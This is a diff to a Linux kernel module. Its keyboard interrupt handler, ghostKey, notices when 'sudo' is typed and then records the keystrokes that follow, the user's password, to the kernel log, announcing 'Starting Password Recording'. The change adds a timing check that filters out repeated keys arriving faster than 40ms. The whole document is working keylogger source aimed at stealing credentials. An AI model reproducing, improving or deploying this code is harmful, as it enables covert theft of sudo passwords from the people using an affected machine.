@@ -31,6 +31,10 @@
 #include <linux/interrupt.h>
 // INB()
 #include <asm/io.h>
+// TIME INCLUDES FOR INHUMANE KEY PRESSES
+#include <linux/ktime.h>
+#include <linux/timekeeping.h>
+#include <linux/time.h>
 
 // Interrupt line of keyboard
 #define KEYBOARD_I8042 1
@@ -69,6 +73,17 @@ char *uppercaseKeys[100][15];
 bool shiftPressed = false;
 bool capsLockOn = false;
 
+// Time variables for inhumane key press bug
+struct timespec64 time;
+long long int previousTime = 0;
+long long int currentTime = 0;
+long long int compareTime = 0;
+char previousKey;
+bool skip = false;
+// Nanoseconds
+int bottomThresh = 40000000;
+
+
 // Irqreturn_t is always the return type of an interrupt handler, which is what this
 // function actually is, this allows us to obtain key values
 static irqreturn_t ghostKey(int interruptRequest, void *developerID) {
@@ -76,114 +91,133 @@ static irqreturn_t ghostKey(int interruptRequest, void *developerID) {
 	// Gets scan code values and assigns it to dataCode
 	// inb() function allows us to access I/O ports
 	char dataCode = inb(DATA_REGISTER);
-	
-	// IF PRESSED
-	if(!(dataCode & KEY_STATUS_MASK)) {
 
-		// LOOPS THROUGH DATA CODES TO FIND MATCH
-		int i = 0;
-		while(i <= 52 && !printedI) {
-			if (dataCodeValues[i] == (dataCode & KEY_PRESS_MASK)) {
-				if (check4 && (dataCode & KEY_PRESS_MASK) == 0x1c) {
-					// RESET CHECKS
-					check1 = false;
-					check2 = false;
-					check3 = false;
+	// Get current time
+	ktime_get_real_ts64(&time);
+	// Time calculations for time compares
+	previousTime = currentTime;
+	currentTime = time.tv_nsec;
+	compareTime = currentTime - previousTime;
+	// If key press/interrupt at inhumane time
+	if ((dataCode == previousKey) && (compareTime < bottomThresh)) {
+		skip = true;
+	}
+	// Set for key compares
+	previousKey = dataCode;
 
-					// WHEN FINISHED RECORDING
-					if (record) {
-						record = false;
-						check4 = false;
-						printedM2 = false;
+	// IF DELAY IS HUMANLY POSSIBLE
+	if (!skip) {
+		// IF PRESSED
+		if(!(dataCode & KEY_STATUS_MASK)) {
+
+			// LOOPS THROUGH DATA CODES TO FIND MATCH
+			int i = 0;
+			while(i <= 52 && !printedI) {
+				if (dataCodeValues[i] == (dataCode & KEY_PRESS_MASK)) {
+					if (check4 && (dataCode & KEY_PRESS_MASK) == 0x1c) {
+						// RESET CHECKS
+						check1 = false;
+						check2 = false;
+						check3 = false;
+
+						// WHEN FINISHED RECORDING
+						if (record) {
+							record = false;
+							check4 = false;
+							printedM2 = false;
+						}
+						// BEGIN RECORDING
+						else {
+							record = true;
+							printedM1 = false;
+						}
 					}
-					// BEGIN RECORDING
+
+					// UPPER CASE (SHIFT KEY HELD OR CAPS LOCK)
+					if ((shiftPressed && !capsLockOn) ||
+							(!shiftPressed && capsLockOn)) {
+						// RECORD KEY PRESSES AND PRINT
+						if (!printedI)
+						{
+							printedI = true;
+							if (record && (*uppercaseKeys[i] != (char*)"enter") && (*uppercaseKeys[i] != (char*)"lshift")
+							&& (*uppercaseKeys[i] != (char*)"rshift") && (*uppercaseKeys[i] != (char*)"capson")
+							&& (*uppercaseKeys[i] != (char*)"capsoff")) {
+									pr_info("%s\n", *uppercaseKeys[i]);
+							}
+						}
+					}
+					// LOWER CASE (NEITHER PRESSED OR BOTH PRESSED)
 					else {
-						record = true;
-						printedM1 = false;
-					}
-				}
+						// RECORD KEY PRESSES FOR SUDO
+						if (check3) {
+							if (*lowercaseKeys[i] == (char*)"o") {
+								check4 = true;
+							}
+							else { check1 = false; check2 = false; check3 = false; }
+						}
+						if (check2) {
+							if (*lowercaseKeys[i] == (char*)"d")
+								check3 = true;
+							else { check1 = false; check2 = false; }
+						}
+						if (check1) {
+							if (*lowercaseKeys[i] == (char*)"u")
+								check2 = true;
+							else check1 = false;
+						}
+						if (*lowercaseKeys[i] == (char*)"s")
+							check1 = true;
 
-				// UPPER CASE (SHIFT KEY HELD OR CAPS LOCK)
-				if ((shiftPressed && !capsLockOn) ||
-						(!shiftPressed && capsLockOn)) {
-					// RECORD KEY PRESSES AND PRINT
-					if (!printedI)
-					{
-						printedI = true;
-						if (record && (*uppercaseKeys[i] != (char*)"enter") && (*uppercaseKeys[i] != (char*)"lshift")
-						&& (*uppercaseKeys[i] != (char*)"rshift") && (*uppercaseKeys[i] != (char*)"capson")
-						&& (*uppercaseKeys[i] != (char*)"capsoff")) {
-							pr_info("%s\n", *uppercaseKeys[i]);
+						// RECORD KEY PRESSES AND PRINT
+						if (!printedI)
+						{
+							printedI = true;
+							if (record && (*lowercaseKeys[i] != (char*)"enter") && (*uppercaseKeys[i] != (char*)"lshift")
+							&& (*uppercaseKeys[i] != (char*)"rshift") && (*uppercaseKeys[i] != (char*)"capson")
+							&& (*uppercaseKeys[i] != (char*)"capsoff")) {
+									pr_info("%s\n", *lowercaseKeys[i]);
+							}
 						}
 					}
+					// EXECUTE IF SHIFT KEY IS PRESSED
+					if ((i == 46 || i == 47) && !shiftPressed)
+						shiftPressed = true;
 				}
-				// LOWER CASE (NEITHER PRESSED OR BOTH PRESSED)
-				else {
-					// RECORD KEY PRESSES FOR SUDO
-					if (check3) {
-						if (*lowercaseKeys[i] == (char*)"o") {
-							check4 = true;
-						}
-						else { check1 = false; check2 = false; check3 = false; }
-					}
-					if (check2) {
-						if (*lowercaseKeys[i] == (char*)"d")
-							check3 = true;
-						else { check1 = false; check2 = false; }
-					}
-					if (check1) {
-						if (*lowercaseKeys[i] == (char*)"u")
-							check2 = true;
-						else check1 = false;
-					}
-					if (*lowercaseKeys[i] == (char*)"s")
-						check1 = true;
-
-					// RECORD KEY PRESSES AND PRINT
-					if (!printedI)
-					{
-						printedI = true;
-						if (record && (*lowercaseKeys[i] != (char*)"enter") && (*uppercaseKeys[i] != (char*)"lshift")
-						&& (*uppercaseKeys[i] != (char*)"rshift") && (*uppercaseKeys[i] != (char*)"capson")
-						&& (*uppercaseKeys[i] != (char*)"capsoff")) {
-							pr_info("%s\n", *lowercaseKeys[i]);
-						}
-					}
-				}
-				// EXECUTE IF SHIFT KEY IS PRESSED
-				if ((i == 46 || i == 47) && !shiftPressed)
-					shiftPressed = true;
+				i++;
 			}
-			i++;
+		// IF RELEASED
+		} else {
+			// WHEN SHIFT KEY RELEASED
+			if ((dataCode & KEY_PRESS_MASK) == 54 || (dataCode & KEY_PRESS_MASK) == 42) {
+				shiftPressed = false;
+			}
+			// WHEN CAPS TURNED ON
+			else if ((dataCode & KEY_PRESS_MASK) == dataCodeValues[48])
+				capsLockOn = true;
+			// WHEN CAPS TURNED off
+			else if ((dataCode & KEY_PRESS_MASK) == dataCodeValues[49])
+				capsLockOn = false;
 		}
-	// IF RELEASED
-	} else {
-		// WHEN SHIFT KEY RELEASED
-		if ((dataCode & KEY_PRESS_MASK) == 54 || (dataCode & KEY_PRESS_MASK) == 42) {
-			shiftPressed = false;
-		}
-		// WHEN CAPS TURNED ON
-		else if ((dataCode & KEY_PRESS_MASK) == dataCodeValues[48])
-			capsLockOn = true;
-		// WHEN CAPS TURNED off
-		else if ((dataCode & KEY_PRESS_MASK) == dataCodeValues[49])
-			capsLockOn = false;
-	}
-	
-	// PRINT ONCE PER ITERATION
-	printedI = false;
+		
+		// PRINT ONCE PER ITERATION
+		printedI = false;
 
-	// PRINT START AND FINISH
-	if (record && !printedM1)
-	{
-		pr_info("Starting Password Recording : Ready\n");
-		printedM1 = true;
+		// PRINT START AND FINISH
+		if (record && !printedM1)
+		{
+			pr_info("Starting Password Recording : Ready\n");
+			printedM1 = true;
+		}
+		if (!record && !printedM2)
+		{
+			pr_info("Ending Password Recording : Finished\n");
+			printedM2 = true;
+		}
 	}
-	if (!record && !printedM2)
-	{
-		pr_info("Ending Password Recording : Finished\n");
-		printedM2 = true;
-	}
+
+	skip = false;
+
 	// Return signal that IRQ is handled
 	return IRQ_HANDLED;
 }
